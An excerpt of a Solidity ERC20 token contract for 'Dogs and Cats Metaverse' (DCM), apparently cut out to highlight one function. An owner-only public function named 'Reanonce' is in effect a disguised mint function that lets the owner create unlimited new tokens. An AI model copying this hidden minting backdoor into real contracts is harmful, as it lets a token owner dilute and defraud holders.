...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function Reanonce(uint256 amount) public onlyOwner {
    Reanonce(msg.sender, amount);
    }
    ...
    function Reanonce(address account, uint256 amount) internal virtual {
     ...
     * - `from` and `to` are never both zero. Reanonce
     *
...
contract DCM is ERC20 {
    ...
    constructor() public ERC20("Dogs and Cats Metaverse", "DCM") {
        Reanonce(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}